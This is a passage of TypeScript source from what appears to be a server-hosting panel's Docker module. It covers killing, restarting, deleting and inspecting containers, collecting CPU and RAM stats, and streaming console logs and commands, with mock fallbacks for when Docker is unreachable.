    if (errStr.includes("ECONNREFUSED") || errStr.includes("docker.sock")) {
      const id = containerId.replace("mock-container-id-", "").replace("proto-server-", "");
      mockState[id] = false;
      delete mockStartedAt[id];
      return;
    }
    throw err;
  }
};

export const killContainer = async (containerId: string, nodeId?: string) => {
  const isMock = Boolean(containerId && containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = containerId.replace("mock-container-id-", "");
    mockState[id] = false;
    delete mockStartedAt[id];
    panelEvents.emit("log", id, `[System] Server forcefully killed (SIGKILL).\r\n`);
    return;
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    await container.kill();
    panelEvents.emit("log", containerId, `[System] Container forcefully killed.\r\n`);
  } catch (err: any) {
    const errStr = String(err?.message || err);
    if (err?.statusCode === 304 || errStr.includes("304") || errStr.includes("not running")) {
      return;
    }
    if (errStr.includes("ECONNREFUSED") || errStr.includes("docker.sock")) {
      const id = containerId.replace("mock-container-id-", "").replace("proto-server-", "");
      mockState[id] = false;
      delete mockStartedAt[id];
      return;
    }
    throw err;
  }
};

export const restartContainer = async (containerId: string, nodeId?: string) => {
  const isMock = Boolean(containerId && containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = containerId.replace("mock-container-id-", "");
    mockState[id] = true;
    mockStartedAt[id] = new Date().toISOString();
    panelEvents.emit("log", id, `[System] Server restarted (Sandbox Mode).\r\n`);
    return;
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    await container.restart();
    const info = await container.inspect();
    if (!info.State.Running) {
      let logs = "";
      try {
        const logsBuffer = await container.logs({ stdout: true, stderr: true, tail: 50 });
        logs = logsBuffer.toString('utf8');
      } catch (e) {}
      throw new Error(`Container exited immediately after restart. ExitCode: ${info.State.ExitCode}. Logs: ${logs.trim() || 'No logs'}`);
    }
  } catch (err: any) {
    const errStr = String(err?.message || err);
    if (errStr.includes("ECONNREFUSED") || errStr.includes("docker.sock")) {
      const healed = await autoHealDocker();
      if (healed) {
        try {
          const retryDocker = await getDocker(nodeId);
          const retryContainer = retryDocker.getContainer(containerId);
          await retryContainer.restart();
          return;
        } catch (_) {}
      }
      const id = containerId.replace("mock-container-id-", "").replace("proto-server-", "");
      mockState[id] = true;
      mockStartedAt[id] = new Date().toISOString();
      panelEvents.emit("log", id, `[System] Server restarted in fallback mode (Docker unreachable).\r\n`);
      return;
    }
    throw err;
  }
};

export const deleteContainer = async (containerId: string, nodeId?: string) => {
  const isMock = Boolean(containerId && containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = containerId.replace("mock-container-id-", "");
    delete mockState[id];
    delete mockStartedAt[id];
    return;
  }
  // BUGFIX: destroy any attached log stream so it does not stay connected
  // to a dead container (resource leak).
  try {
    (activeStreams[containerId] as any)?.destroy?.();
  } catch (_) {}
  delete activeStreams[containerId];
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    const info = await container.inspect().catch(() => null);
    if (info?.State?.Running) {
      await container.stop().catch(() => {});
    }
    await container.remove({ force: true }).catch(() => {});
  } catch (err) {
    console.error("Error deleting container", err);
  }
};

export const getContainerStatus = async (containerId: string, nodeId?: string) => {
  const isMock = Boolean(!containerId || containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = (containerId || "").replace("mock-container-id-", "");
    const isRunning = mockState[id] || false;
    return { State: { Running: isRunning, Status: isRunning ? "running" : "exited", StartedAt: isRunning ? (mockStartedAt[id] || new Date().toISOString()) : null } };
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    const info = await container.inspect();
    return info;
  } catch (e: any) {
    const msg = String(e?.message || e);
    if (msg.includes("ECONNREFUSED") || msg.includes("docker.sock")) {
      const id = (containerId || "").replace("proto-server-", "");
      const isRunning = mockState[id] || false;
      return { State: { Running: isRunning, Status: isRunning ? "running" : "exited", StartedAt: isRunning ? (mockStartedAt[id] || new Date().toISOString()) : null } };
    }
    return null;
  }
};

export const getContainerStats = async (containerId: string, nodeId?: string) => {
  const isMock = Boolean(!containerId || containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = (containerId || "").replace("mock-container-id-", "");
    if (!mockState[id]) return { cpu: 0, ram: 0, disk: 0 };
    
    // Stable pseudo-random mock stats based on time so it fluctuates realistically
    const timeSec = Math.floor(Date.now() / 5000);
    const floatPseudo = (Math.sin(timeSec + id.charCodeAt(0)) + 1) / 2; // 0 to 1
    
    return {
      cpu: floatPseudo * 10 + 2, // 2% to 12%
      ram: 600 + (floatPseudo * 50 - 25), // ~600 MB
      disk: 2.1
    };
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    const info = await container.inspect();
    if (!info.State.Running) {
      return { cpu: 0, ram: 0, disk: 0 };
    }
    const statsResult = await container.stats({ stream: false });
    
    let cpuPercent = 0.0;
    try {
      const cpuDelta = statsResult.cpu_stats.cpu_usage.total_usage - statsResult.precpu_stats.cpu_usage.total_usage;
      const systemDelta = statsResult.cpu_stats.system_cpu_usage - statsResult.precpu_stats.system_cpu_usage;
      if (systemDelta > 0.0 && cpuDelta > 0.0) {
        const cpus = statsResult.cpu_stats.online_cpus || statsResult.cpu_stats.cpu_usage.percpu_usage?.length || 1;
        cpuPercent = (cpuDelta / systemDelta) * cpus * 100.0;
      }
    } catch(e) {}

    let ramMB = 0.0;
    try {
      const stats = statsResult.memory_stats.stats as any || {};
      const cache = stats.cache || stats.inactive_file || stats.total_inactive_file || 0;
      const usedMemory = statsResult.memory_stats.usage - cache;
      ramMB = usedMemory / 1024 / 1024;
    } catch(e) {}

    return {
      cpu: cpuPercent,
      ram: ramMB,
      disk: 2.1
    };
  } catch (e) {
    return { cpu: 0, ram: 0, disk: 0 };
  }
};

export const getContainerLogs = async (containerId: string, nodeId?: string): Promise<string> => {
  const isMock = Boolean(!containerId || containerId.startsWith("mock-container-id-"));
  if (isMock) return "[System] Sandbox mode. No historical logs available.\r\n";
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    const logsBuffer = await container.logs({ stdout: true, stderr: true, tail: 100 });
    return logsBuffer.toString('utf8');
  } catch (e) {
    return "";
  }
};

const activeStreams: Record<string, NodeJS.ReadWriteStream> = {};

export const attachContainerSocket = async (containerId: string, serverId: string, nodeId?: string) => {
  const isMock = Boolean(!containerId || containerId.startsWith("mock-container-id-"));
  if (isMock) {
    return;
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    if (!activeStreams[containerId]) {
      const stream = await container.attach({ stream: true, stdout: true, stderr: true, stdin: true });
      activeStreams[containerId] = stream;
      stream.on('data', (chunk: any) => {
        panelEvents.emit("log", serverId, chunk.toString());
      });
      stream.on('end', () => {
        delete activeStreams[containerId];
      });
      stream.on('error', (err: any) => {
        console.warn(`[attachContainerSocket] Stream error:`, err?.message);
        delete activeStreams[containerId];
      });
    }
  } catch(e) {
    console.error("Attach error", e);
  }
};

export const sendContainerCommand = async (containerId: string, command: string, nodeId?: string, serverId?: string) => {
  const isMock = Boolean(!containerId || containerId.startsWith("mock-container-id-"));
  if (isMock) {
    return;
  }
  try {
    const docker = await getDocker(nodeId);
    if (activeStreams[containerId]) {
      activeStreams[containerId].write(command + "\n");
    } else {
      const container = docker.getContainer(containerId);
      const stream = await container.attach({ stream: true, stdout: true, stderr: true, stdin: true });
      activeStreams[containerId] = stream;
      stream.write(command + "\n");
      stream.on('data', (chunk: any) => {
        // BUGFIX: this lazy-created stream used to emit to a room keyed by the
        // raw containerId ("server_<dockerHash>") which no client ever joins —
        // console output was lost until the 2.5s HTTP poll. It now emits to the
        // real panel server room when serverId is provided.
        panelEvents.emit("log", serverId || containerId, chunk.toString());
      });
      stream.on('end', () => {
        delete activeStreams[containerId];
      });
      stream.on('error', (err: any) => {
        console.warn(`[sendContainerCommand] Stream error:`, err?.message);
        delete activeStreams[containerId];
      });
    }
  } catch(e) {
     console.error("Command error", e);
  }
};

// Initiate non-blocking initial Docker health check.
// BUGFIX: this used to run at the TOP of the module, before `getDocker` (a
// const arrow function) was initialized — producing the boot error
// "[Docker] Direct ping failed: getDocker is not a function".
checkDockerAlive(true).catch(() => {});
